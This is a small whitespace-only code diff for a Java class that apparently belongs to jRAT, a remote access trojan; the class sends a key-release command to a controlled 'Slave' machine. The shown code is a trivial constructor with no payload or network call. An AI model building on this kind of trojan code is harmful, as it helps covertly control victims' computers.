@@ -4,11 +4,10 @@ import java.io.DataOutputStream;
 
 import pro.jrat.Slave;
 
-
 public class Packet95KeyRelease extends AbstractOutgoingPacket {
-	
+
 	private int keyCode;
-	
+
 	public Packet95KeyRelease(int keyCode) {
 		this.keyCode = keyCode;
 	}
